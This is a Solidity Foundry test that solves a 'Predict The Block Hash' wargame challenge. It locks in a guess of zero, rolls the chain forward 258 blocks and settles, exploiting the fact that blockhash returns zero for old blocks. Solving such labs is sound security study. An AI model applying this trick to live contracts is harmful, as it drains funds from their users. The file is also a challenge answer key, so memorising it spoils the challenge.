// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { Test } from "forge-std/Test.sol";
import { PredictTheBlockHashChallenge } from "../src/challenges/09_PredictTheBlockHash/PredictTheBlockHashChallenge.sol";
import { PredictTheBlockHashChallengeFactory } from "../src/challenges/09_PredictTheBlockHash/PredictTheBlockHashChallengeFactory.sol";

contract PredictTheBlockHashTest is Test {
    PredictTheBlockHashChallenge public challenge;

    function setUp() public {
        PredictTheBlockHashChallengeFactory factory = new PredictTheBlockHashChallengeFactory();
        challenge = factory.createChallenge{ value: 1 ether }();
    }

    function test() public {
        challenge.lockInGuess{ value: 1 ether }(
            0x0000000000000000000000000000000000000000000000000000000000000000
        );
        vm.roll(block.number + 258);
        challenge.settle();

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}
